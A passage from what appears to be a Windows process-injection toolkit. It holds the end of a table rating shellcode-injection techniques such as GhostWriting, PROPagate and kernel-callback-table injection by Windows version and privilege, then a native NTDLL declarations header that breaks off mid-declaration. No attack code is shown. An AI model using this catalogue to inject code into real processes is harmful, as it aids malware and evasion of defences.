--------| 		:-: 		|    :-: 			| :-: 			| :-:       		| :-: 				| :-: 
32 Bit			| 	 ✔		|		✔			|       ✔		|   	➖			|	✔				|	➖
64 Bit			| 	 ✔		|		✔		    |		✔	 	|		✔			|	✔				|	✔
WoW64			| 	 ✔		|		✔			|		✔		|		➖			|	✔				|	➖
Windows 7		| 	 ✔     |		✔			|		✔		|		✔			|	✔				|	✔
Windows 10		| 	 ✔     |		✔			|		✔		|		✔			|	✔				|	➖
Unpriviledged 	| 	 ✔     |		❌			|		❌		|		✔			|	✔				|	❌


## Shellcode injections
Feature | 		Classic		|	 Entrypoint 	| Extra Window Memory 	| GhostWriting  	| PROPagate			| TLS Callback | Kernel Callback Table
--------| 		:-: 		|    :-: 			| :-: 					| :-:       		| :-: 				| :-: 			| :-: 
32 Bit			| 	 ✔		|		✔			|       ✔				|   	✔			|	✔				|	✔			|	✔
64 Bit			| 	 ✔		|		✔		    |		✔	 			|		✔			|	✔				|	✔			|	✔
WoW64			| 	 ✔		|		✔			|		✔				|		✔			|	✔				|	✔			|	✔
Windows 7		| 	 ✔     |		✔			|		✔				|		➖			|	✔				|	✔			|	✔
Windows 10		| 	 ✔     |		✔			|		✔				|		✔			|	✔				|	✔			|	✔
```

`common/ntddk.h`:

```h
#ifndef __NTDLL_H__
#define __NTDLL_H__

#ifdef __cplusplus
extern "C" {
#endif
#include <Windows.h>

#ifdef _NTDDK_
#error This header cannot be compiled together with NTDDK
#endif
    /*
    //Do not insert the library. Only definitions.

    #ifndef _NTDLL_SELF_                            // Auto-insert the library
    #pragma comment(lib, "Ntdll.lib")
    #endif
    */
#pragma warning(disable: 4201)                  // nonstandard extension used : nameless struct/union

#pragma warning(push)
#pragma warning(disable:4005)
#include <ntstatus.h>
#pragma warning(pop)

    //------------------------------------------------------------------------------
    // Defines for NTSTATUS

    typedef long NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#ifndef ASSERT
#ifdef _DEBUG
#define ASSERT(x) assert(x)
#else
#define ASSERT(x) /* x */
#endif
#endif

    //------------------------------------------------------------------------------
    // Structures

    typedef enum _EVENT_TYPE
    {
        NotificationEvent,
        SynchronizationEvent

    } EVENT_TYPE;

    //
    // ANSI strings are counted 8-bit character strings. If they are
    // NULL terminated, Length does not include trailing NULL.
    //

#ifndef _NTSECAPI_
    typedef struct _STRING
    {
        USHORT Length;
        USHORT MaximumLength;
        PCHAR  Buffer;

    } STRING, * PSTRING;

    //
    // Unicode strings are counted 16-bit character strings. If they are
    // NULL terminated, Length does not include trailing NULL.
    //

    typedef struct _UNICODE_STRING
    {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;

    } UNICODE_STRING, * PUNICODE_STRING;
#endif // _NTSECAPI_

    typedef STRING ANSI_STRING;
    typedef PSTRING PANSI_STRING;

    typedef STRING OEM_STRING;
    typedef PSTRING POEM_STRING;
    typedef CONST STRING* PCOEM_STRING;

    typedef const UNICODE_STRING* PCUNICODE_STRING;

#define UNICODE_NULL ((WCHAR)0) // winnt

    //
    // Valid values for the Attributes field
    //

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

//
// Object Attributes structure
//

    typedef struct _OBJECT_ATTRIBUTES
    {
        ULONG Length;
        HANDLE RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
        PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE

    } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
#endif  // OBJ_CASE_INSENSITIVE

    //
    // IO_STATUS_BLOCK
    //

    typedef struct _IO_STATUS_BLOCK
    {
        union
        {
            NTSTATUS Status;
            PVOID Pointer;
        };

        ULONG_PTR Information;

    } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

    //
    // ClientId
    //

    typedef struct _CLIENT_ID
    {
        HANDLE UniqueProcess;
        HANDLE UniqueThread;

    } CLIENT_ID, * PCLIENT_ID;


    //
    // CURDIR structure
    //

    typedef struct _CURDIR
    {
        UNICODE_STRING DosPath;
        HANDLE Handle;

    } CURDIR, * PCURDIR;


    //------------------------------------------------------------------------------
    // Macros

    // INIT_UNICODE_STRING is a replacement of RtlInitUnicodeString
#ifndef INIT_UNICODE_STRING
#define INIT_UNICODE_STRING(us, wch)                 \
    us.MaximumLength = (USHORT)sizeof(wch);          \
    us.Length        = (USHORT)(wcslen(wch) * sizeof(WCHAR)); \
    us.Buffer        = wch
#endif


#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif


#ifndef InitializePortHeader
#define InitializeMessageHeader( ph, l, t ) {                  \
    (ph)->TotalLength    = (USHORT)(l);                        \
    (ph)->DataLength     = (USHORT)(l - sizeof(PORT_MESSAGE)); \
    (ph)->Type           = (USHORT)(t);                        \
    (ph)->VirtualRangesOffset = 0;                             \
    }
#endif

//-----------------------------------------------------------------------------
// Image functions

    NTSYSAPI
        PVOID
        NTAPI
        RtlImageNtHeader(
            IN PVOID BaseAddress
        );

    NTSYSAPI
        PVOID
        NTAPI
        RtlImageDirectoryEntryToData(
            IN PVOID Base,
            IN BOOLEAN MappedAsImage,
            IN USHORT DirectoryEntry,
            OUT PULONG Size
        );

    //-----------------------------------------------------------------------------
    // Unicode string functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlStringFromGUID(
            IN REFGUID Guid,
            OUT PUNICODE_STRING GuidString
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlInitUnicodeString(
            PUNICODE_STRING DestinationString,
            PCWSTR SourceString
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlCreateUnicodeString(
            OUT PUNICODE_STRING DestinationString,
            IN PCWSTR SourceString
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlCreateUnicodeStringFromAsciiz(
            OUT PUNICODE_STRING Destination,
            IN PCSTR Source
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlPrefixUnicodeString(
            IN PUNICODE_STRING String1,
            IN PUNICODE_STRING String2,
            IN BOOLEAN CaseInSensitive
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlDuplicateUnicodeString(
            IN  BOOLEAN AllocateNew,
            IN  PUNICODE_STRING SourceString,
            OUT PUNICODE_STRING TargetString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAppendUnicodeToString(
            PUNICODE_STRING Destination,
            PCWSTR Source
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAppendUnicodeStringToString(
            IN OUT PUNICODE_STRING Destination,
            IN PUNICODE_STRING Source
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlUnicodeStringToInteger(
            IN PUNICODE_STRING String,
            IN ULONG Base OPTIONAL,
            OUT PULONG Value
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlIntegerToUnicodeString(
            IN ULONG Value,
            IN ULONG Base OPTIONAL,
            IN OUT PUNICODE_STRING String
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlGUIDFromString(
            IN PUNICODE_STRING GuidString,
            OUT GUID* Guid
        );


    NTSYSAPI
        LONG
        NTAPI
        RtlCompareUnicodeString(
            IN PUNICODE_STRING String1,
            IN PUNICODE_STRING String2,
            IN BOOLEAN CaseInSensitive
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlCopyUnicodeString(
            OUT PUNICODE_STRING DestinationString,
            IN PUNICODE_STRING SourceString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlUpcaseUnicodeString(
            OUT PUNICODE_STRING DestinationString,
            IN PUNICODE_STRING SourceString,
            IN BOOLEAN AllocateDestinationString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlDowncaseUnicodeString(
            OUT PUNICODE_STRING DestinationString,
            IN PUNICODE_STRING SourceString,
            IN BOOLEAN AllocateDestinationString
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlEqualUnicodeString(
            IN PUNICODE_STRING String1,
            IN PUNICODE_STRING String2,
            IN BOOLEAN CaseInSensitive
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlFreeUnicodeString(
            IN  PUNICODE_STRING UnicodeString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAnsiStringToUnicodeString(
            OUT PUNICODE_STRING DestinationString,
            IN PANSI_STRING SourceString,
            IN BOOLEAN AllocateDestinationString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlUnicodeStringToAnsiString(
            OUT PANSI_STRING DestinationString,
            IN PUNICODE_STRING SourceString,
            IN BOOLEAN AllocateDestinationString
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlInitAnsiString(
            OUT PANSI_STRING DestinationString,
            IN PCHAR SourceString
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlFreeAnsiString(
            IN PANSI_STRING AnsiString
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlFormatCurrentUserKeyPath(
            OUT PUNICODE_STRING CurrentUserKeyPath
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlRaiseStatus(
            IN NTSTATUS Status
        );


    NTSYSAPI
        VOID
        NTAPI
        DbgBreakPoint(
            VOID
        );


    NTSYSAPI
        ULONG
        _cdecl
        DbgPrint(
            PCH Format,
            ...
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlRandom(
            IN OUT PULONG Seed
        );

    //-----------------------------------------------------------------------------
    // Critical section functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlInitializeCriticalSection(
            IN  PRTL_CRITICAL_SECTION CriticalSection
        );


    NTSYSAPI
        BOOL
        NTAPI
        RtlTryEnterCriticalSection(
            IN PRTL_CRITICAL_SECTION CriticalSection
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlEnterCriticalSection(
            IN PRTL_CRITICAL_SECTION CriticalSection
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlLeaveCriticalSection(
            IN PRTL_CRITICAL_SECTION CriticalSection
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlDeleteCriticalSection(
            IN  PRTL_CRITICAL_SECTION CriticalSection
        );

    //-----------------------------------------------------------------------------
    // Object functions

    //
    // Object Manager Directory Specific Access Rights.
    //

#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#endif

    typedef enum _POOL_TYPE {
        NonPagedPool,
        PagedPool,
        NonPagedPoolMustSucceed,
        DontUseThisType,
        NonPagedPoolCacheAligned,
        PagedPoolCacheAligned,
        NonPagedPoolCacheAlignedMustS,
        MaxPoolType
    } POOL_TYPE;


    //
    // For NtQueryObject
    //

    typedef enum _OBJECT_INFORMATION_CLASS {
        ObjectBasicInformation,          // = 0
        ObjectNameInformation,          // = 1
        ObjectTypeInformation,          // = 2
        ObjectTypesInformation,         // = 3    //object handle is ignored
        ObjectHandleFlagInformation     // = 4
    } OBJECT_INFORMATION_CLASS;

    //
    // NtQueryObject uses ObjectBasicInformation
    //

    typedef struct _OBJECT_BASIC_INFORMATION {
        ULONG Attributes;
        ACCESS_MASK GrantedAccess;
        ULONG HandleCount;
        ULONG PointerCount;
        ULONG PagedPoolCharge;
        ULONG NonPagedPoolCharge;
        ULONG Reserved[3];
        ULONG NameInfoSize;
        ULONG TypeInfoSize;
        ULONG SecurityDescriptorSize;
        LARGE_INTEGER CreationTime;
    } OBJECT_BASIC_INFORMATION, * POBJECT_BASIC_INFORMATION;

    //
    // NtQueryObject uses ObjectNameInformation
    //

    typedef struct _OBJECT_NAME_INFORMATION {
        UNICODE_STRING Name;
    } OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

    //
    // NtQueryObject uses ObjectTypeInformation
    //

    typedef struct _OBJECT_TYPE_INFORMATION {
        UNICODE_STRING TypeName;
        ULONG TotalNumberOfObjects;
        ULONG TotalNumberOfHandles;
        ULONG TotalPagedPoolUsage;
        ULONG TotalNonPagedPoolUsage;
        ULONG TotalNamePoolUsage;
        ULONG TotalHandleTableUsage;
        ULONG HighWaterNumberOfObjects;
        ULONG HighWaterNumberOfHandles;
        ULONG HighWaterPagedPoolUsage;
        ULONG HighWaterNonPagedPoolUsage;
        ULONG HighWaterNamePoolUsage;
        ULONG HighWaterHandleTableUsage;
        ULONG InvalidAttributes;
        GENERIC_MAPPING GenericMapping;
        ULONG ValidAccessMask;
        BOOLEAN SecurityRequired;
        BOOLEAN MaintainHandleCount;
        POOL_TYPE PoolType;
        ULONG DefaultPagedPoolCharge;
        ULONG DefaultNonPagedPoolCharge;
    } OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

    //
    // NtQueryObject uses ObjectHandleFlagInformation
    // NtSetInformationObject uses ObjectHandleFlagInformation
    //

    typedef struct _OBJECT_HANDLE_FLAG_INFORMATION {
        BOOLEAN Inherit;
        BOOLEAN ProtectFromClose;
    } OBJECT_HANDLE_FLAG_INFORMATION, * POBJECT_HANDLE_FLAG_INFORMATION;

    //
    // NtQueryDirectoryObject uses this type
    //

    typedef struct _OBJECT_DIRECTORY_INFORMATION {
        UNICODE_STRING Name;
        UNICODE_STRING TypeName;
    } OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenDirectoryObject(
            OUT PHANDLE DirectoryHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryDirectoryObject(
            IN HANDLE DirectoryHandle,
            OUT PVOID Buffer,
            IN ULONG Length,
            IN BOOLEAN ReturnSingleEntry,
            IN BOOLEAN RestartScan,
            IN OUT PULONG Context,
            OUT PULONG ReturnLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryObject(
            IN HANDLE ObjectHandle,
            IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
            OUT PVOID ObjectInformation,
            IN ULONG Length,
            OUT PULONG ResultLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetInformationObject(
            IN HANDLE ObjectHandle,
            IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
            IN PVOID ObjectInformation,
            IN ULONG Length
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDuplicateObject(
            IN HANDLE SourceProcessHandle,
            IN HANDLE SourceHandle,
            IN HANDLE TargetProcessHandle OPTIONAL,
            OUT PHANDLE TargetHandle OPTIONAL,
            IN ACCESS_MASK DesiredAccess,
            IN ULONG HandleAttributes,
            IN ULONG Options
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQuerySecurityObject(
            IN HANDLE ObjectHandle,
            IN SECURITY_INFORMATION SecurityInformation,
            OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
            IN ULONG DescriptorLength,
            OUT PULONG ReturnLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetSecurityObject(
            IN HANDLE ObjectHandle,
            IN SECURITY_INFORMATION SecurityInformation,
            IN PSECURITY_DESCRIPTOR SecurityDescriptor
        );


    //-----------------------------------------------------------------------------
    // Handle table RTL functions

#define LEVEL_HANDLE_ID         0x74000000
#define LEVEL_HANDLE_ID_MASK    0xFF000000
#define LEVEL_HANDLE_INDEX_MASK 0x00FFFFFF

    typedef enum _RTL_GENERIC_COMPARE_RESULTS {
        GenericLessThan,
        GenericGreaterThan,
        GenericEqual
    } RTL_GENERIC_COMPARE_RESULTS;


    typedef struct _RTL_SPLAY_LINKS
    {
        struct _RTL_SPLAY_LINKS* Parent;
        struct _RTL_SPLAY_LINKS* LeftChild;
        struct _RTL_SPLAY_LINKS* RightChild;
    } RTL_SPLAY_LINKS, * PRTL_SPLAY_LINKS;


    struct _RTL_GENERIC_TABLE;

    typedef
        RTL_GENERIC_COMPARE_RESULTS
        (NTAPI* PRTL_GENERIC_COMPARE_ROUTINE) (
            struct _RTL_GENERIC_TABLE* Table,
            PVOID FirstStruct,
            PVOID SecondStruct
            );

    typedef
        PVOID
        (NTAPI* PRTL_GENERIC_ALLOCATE_ROUTINE) (
            struct _RTL_GENERIC_TABLE* Table,
            ULONG ByteSize
            );

    typedef
        VOID
        (NTAPI* PRTL_GENERIC_FREE_ROUTINE) (
            struct _RTL_GENERIC_TABLE* Table,
            PVOID Buffer
            );


    typedef struct _RTL_GENERIC_TABLE {
        PRTL_SPLAY_LINKS TableRoot;
        LIST_ENTRY InsertOrderList;
        PLIST_ENTRY OrderedPointer;
        ULONG WhichOrderedElement;
        ULONG NumberGenericTableElements;
        PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;
        PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;
        PRTL_GENERIC_FREE_ROUTINE FreeRoutine;
        PVOID TableContext;
    } RTL_GENERIC_TABLE, * PRTL_GENERIC_TABLE;


    typedef struct _RTL_HANDLE_TABLE_ENTRY
    {
        struct _RTL_HANDLE_TABLE_ENTRY* Next;    /* pointer to next free handle */
        PVOID  Object;

    } RTL_HANDLE_TABLE_ENTRY, * PRTL_HANDLE_TABLE_ENTRY;


    typedef struct _RTL_HANDLE_TABLE
    {
        ULONG MaximumNumberOfHandles;
        ULONG SizeOfHandleTableEntry;
        ULONG Unknown01;
        ULONG Unknown02;
        PRTL_HANDLE_TABLE_ENTRY FreeHandles;
        PRTL_HANDLE_TABLE_ENTRY CommittedHandles;
        PRTL_HANDLE_TABLE_ENTRY UnCommittedHandles;
        PRTL_HANDLE_TABLE_ENTRY MaxReservedHandles;
    } RTL_HANDLE_TABLE, * PRTL_HANDLE_TABLE;


    NTSYSAPI
        VOID
        NTAPI
        RtlInitializeGenericTable(
            IN PRTL_GENERIC_TABLE Table,
            IN PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,
            IN PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,
            IN PRTL_GENERIC_FREE_ROUTINE FreeRoutine,
            IN PVOID TableContext
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlInitializeHandleTable(
            IN ULONG MaximumNumberOfHandles,
            IN ULONG SizeOfHandleTableEntry,
            OUT PRTL_HANDLE_TABLE HandleTable
        );


    NTSYSAPI
        PRTL_HANDLE_TABLE_ENTRY
        NTAPI
        RtlAllocateHandle(
            IN PRTL_HANDLE_TABLE HandleTable,
            OUT PULONG HandleIndex OPTIONAL
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlFreeHandle(
            IN PRTL_HANDLE_TABLE HandleTable,
            IN PRTL_HANDLE_TABLE_ENTRY Handle
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlIsValidIndexHandle(
            IN PRTL_HANDLE_TABLE HandleTable,
            IN ULONG HandleIndex,
            OUT PRTL_HANDLE_TABLE_ENTRY* Handle
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlInsertElementGenericTable(
            IN PRTL_GENERIC_TABLE Table,
            IN PVOID Buffer,
            IN LONG BufferSize,
            OUT PBOOLEAN NewElement OPTIONAL
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlIsGenericTableEmpty(
            IN PRTL_GENERIC_TABLE Table
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlIsGenericTableEmpty(
            IN PRTL_GENERIC_TABLE Table
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlLookupElementGenericTable(
            IN PRTL_GENERIC_TABLE Table,
            IN PVOID Buffer
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlEnumerateGenericTableWithoutSplaying(
            IN  PRTL_GENERIC_TABLE Table,
            IN  PVOID* RestartKey
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtClose(
            IN  HANDLE Handle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwClose(
            IN  HANDLE Handle
        );

    //-----------------------------------------------------------------------------
    // Environment functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlOpenCurrentUser(
            IN ULONG DesiredAccess,
            OUT PHANDLE CurrentUserKey
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlCreateEnvironment(
            BOOLEAN CloneCurrentEnvironment,
            PVOID* Environment
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlQueryEnvironmentVariable_U(
            PVOID Environment,
            PUNICODE_STRING Name,
            PUNICODE_STRING Value
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlSetEnvironmentVariable(
            PVOID* Environment,
            PUNICODE_STRING Name,
            PUNICODE_STRING Value
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlDestroyEnvironment(
            PVOID Environment
        );

    //-----------------------------------------------------------------------------
    // Registry functions


    typedef enum _KEY_INFORMATION_CLASS
    {
        KeyBasicInformation,
        KeyNodeInformation,
        KeyFullInformation,
        KeyNameInformation,
        KeyCachedInformation,
        KeyFlagsInformation,
        MaxKeyInfoClass  // MaxKeyInfoClass should always be the last enum

    } KEY_INFORMATION_CLASS;

    //
    // Key query structures
    //

    typedef struct _KEY_BASIC_INFORMATION
    {
        LARGE_INTEGER LastWriteTime;
        ULONG   TitleIndex;
        ULONG   NameLength;
        WCHAR   Name[1];            // Variable length string

    } KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;


    typedef struct _KEY_NODE_INFORMATION
    {
        LARGE_INTEGER LastWriteTime;
        ULONG   TitleIndex;
        ULONG   ClassOffset;
        ULONG   ClassLength;
        ULONG   NameLength;
        WCHAR   Name[1];            // Variable length string
    //          Class[1];           // Variable length string not declared
    } KEY_NODE_INFORMATION, * PKEY_NODE_INFORMATION;


    typedef struct _KEY_FULL_INFORMATION
    {
        LARGE_INTEGER LastWriteTime;
        ULONG   TitleIndex;
        ULONG   ClassOffset;
        ULONG   ClassLength;
        ULONG   SubKeys;
        ULONG   MaxNameLen;
        ULONG   MaxClassLen;
        ULONG   Values;
        ULONG   MaxValueNameLen;
        ULONG   MaxValueDataLen;
        WCHAR   Class[1];           // Variable length

    } KEY_FULL_INFORMATION, * PKEY_FULL_INFORMATION;


    // end_wdm
    typedef struct _KEY_NAME_INFORMATION
    {
        ULONG   NameLength;
        WCHAR   Name[1];            // Variable length string

    } KEY_NAME_INFORMATION, * PKEY_NAME_INFORMATION;

    typedef struct _KEY_CACHED_INFORMATION
    {
        LARGE_INTEGER LastWriteTime;
        ULONG   TitleIndex;
        ULONG   SubKeys;
        ULONG   MaxNameLen;
        ULONG   Values;
        ULONG   MaxValueNameLen;
        ULONG   MaxValueDataLen;
        ULONG   NameLength;
        WCHAR   Name[1];            // Variable length string

    } KEY_CACHED_INFORMATION, * PKEY_CACHED_INFORMATION;


    typedef struct _KEY_FLAGS_INFORMATION
    {
        ULONG   UserFlags;

    } KEY_FLAGS_INFORMATION, * PKEY_FLAGS_INFORMATION;



    typedef enum _KEY_VALUE_INFORMATION_CLASS {
        KeyValueBasicInformation,
        KeyValueFullInformation,
        KeyValuePartialInformation,
        KeyValueFullInformationAlign64,
        KeyValuePartialInformationAlign64,
        MaxKeyValueInfoClass  // MaxKeyValueInfoClass should always be the last enum
    } KEY_VALUE_INFORMATION_CLASS;


    typedef struct _KEY_VALUE_FULL_INFORMATION {
        ULONG   TitleIndex;
        ULONG   Type;
        ULONG   DataOffset;
        ULONG   DataLength;
        ULONG   NameLength;
        WCHAR   Name[1];            // Variable size
    //          Data[1];            // Variable size data not declared
    } KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;


    typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
        ULONG   TitleIndex;
        ULONG   Type;
        ULONG   DataLength;
        UCHAR   Data[1];            // Variable size
    } KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;



    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCreateKey(
            OUT PHANDLE KeyHandle,
            IN  ACCESS_MASK DesiredAccess,
            IN  POBJECT_ATTRIBUTES ObjectAttributes,
            IN  ULONG TitleIndex,
            IN  PUNICODE_STRING Class OPTIONAL,
            IN  ULONG CreateOptions,
            OUT PULONG Disposition OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenKey(
            OUT PHANDLE KeyHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryKey(
            IN HANDLE  KeyHandle,
            IN KEY_INFORMATION_CLASS  KeyInformationClass,
            OUT PVOID  KeyInformation,
            IN ULONG  Length,
            OUT PULONG  ResultLength
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtEnumerateKey(
            IN HANDLE KeyHandle,
            IN ULONG Index,
            IN KEY_INFORMATION_CLASS KeyInformationClass,
            IN PVOID KeyInformation,
            IN ULONG Length,
            IN PULONG ResultLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDeleteKey(
            IN HANDLE KeyHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryValueKey(
            IN HANDLE KeyHandle,
            IN PUNICODE_STRING ValueName,
            IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
            OUT PVOID KeyValueInformation,
            IN ULONG Length,
            OUT PULONG ResultLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetValueKey(
            IN HANDLE KeyHandle,
            IN PUNICODE_STRING ValueName,
            IN ULONG TitleIndex OPTIONAL,
            IN ULONG Type,
            IN PVOID Data,
            IN ULONG DataSize
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDeleteValueKey(
            IN HANDLE KeyHandle,
            IN PUNICODE_STRING ValueName
        );

    //-----------------------------------------------------------------------------
    // RtlQueryRegistryValues

    //
    // The following flags specify how the Name field of a RTL_QUERY_REGISTRY_TABLE
    // entry is interpreted.  A NULL name indicates the end of the table.
    //

#define RTL_QUERY_REGISTRY_SUBKEY   0x00000001  // Name is a subkey and remainder of
                                                // table or until next subkey are value
                                                // names for that subkey to look at.

#define RTL_QUERY_REGISTRY_TOPKEY   0x00000002  // Reset current key to original key for
                                                // this and all following table entries.

#define RTL_QUERY_REGISTRY_REQUIRED 0x00000004  // Fail if no match found for this table
                                                // entry.

#define RTL_QUERY_REGISTRY_NOVALUE  0x00000008  // Used to mark a table entry that has no
                                                // value name, just wants a call out, not
                                                // an enumeration of all values.

#define RTL_QUERY_REGISTRY_NOEXPAND 0x00000010  // Used to suppress the expansion of
                                                // REG_MULTI_SZ into multiple callouts or
                                                // to prevent the expansion of environment
                                                // variable values in REG_EXPAND_SZ

#define RTL_QUERY_REGISTRY_DIRECT   0x00000020  // QueryRoutine field ignored.  EntryContext
                                                // field points to location to store value.
                                                // For null terminated strings, EntryContext
                                                // points to UNICODE_STRING structure that
                                                // that describes maximum size of buffer.
                                                // If .Buffer field is NULL then a buffer is
                                                // allocated.
                                                //

#define RTL_QUERY_REGISTRY_DELETE   0x00000040  // Used to delete value keys after they
                                                // are queried.


//
// The following values for the RelativeTo parameter determine what the
// Path parameter to RtlQueryRegistryValues is relative to.
//

#define RTL_REGISTRY_ABSOLUTE     0             // Path is a full path
#define RTL_REGISTRY_SERVICES     1             // \Registry\Machine\System\CurrentControlSet\Services
#define RTL_REGISTRY_CONTROL      2             // \Registry\Machine\System\CurrentControlSet\Control
#define RTL_REGISTRY_WINDOWS_NT   3             // \Registry\Machine\Software\Microsoft\Windows NT\CurrentVersion
#define RTL_REGISTRY_DEVICEMAP    4             // \Registry\Machine\Hardware\DeviceMap
#define RTL_REGISTRY_USER         5             // \Registry\User\CurrentUser
#define RTL_REGISTRY_MAXIMUM      6
#define RTL_REGISTRY_HANDLE       0x40000000    // Low order bits are registry handle
#define RTL_REGISTRY_OPTIONAL     0x80000000    // Indicates the key node is optional


    typedef NTSTATUS(NTAPI* PRTL_QUERY_REGISTRY_ROUTINE)(
        IN PWSTR ValueName,
        IN ULONG ValueType,
        IN PVOID ValueData,
        IN ULONG ValueLength,
        IN PVOID Context,
        IN PVOID EntryContext
        );

    typedef struct _RTL_QUERY_REGISTRY_TABLE
    {
        PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
        ULONG Flags;
        PWSTR Name;
        PVOID EntryContext;
        ULONG DefaultType;
        PVOID DefaultData;
        ULONG DefaultLength;

    } RTL_QUERY_REGISTRY_TABLE, * PRTL_QUERY_REGISTRY_TABLE;


    NTSYSAPI
        NTSTATUS
        NTAPI
